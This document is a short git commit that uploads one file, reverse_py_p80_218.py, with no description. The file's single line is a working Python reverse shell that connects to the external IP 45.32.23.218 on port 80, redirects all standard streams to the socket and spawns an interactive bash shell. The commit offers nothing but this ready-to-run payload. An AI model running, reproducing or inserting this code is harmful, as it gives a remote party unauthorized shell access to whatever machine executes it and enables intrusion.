17971506aeff2543177d3dc9b5781453bc5719da
PhanQuan <45188297+quanpt103@users.noreply.github.com>
2019-07-17 10:18:26 +0700

    Add files via upload

---
+++ reverse_py_p80_218.py
@@ -0,0 +1,1 @@
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("45.32.23.218",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
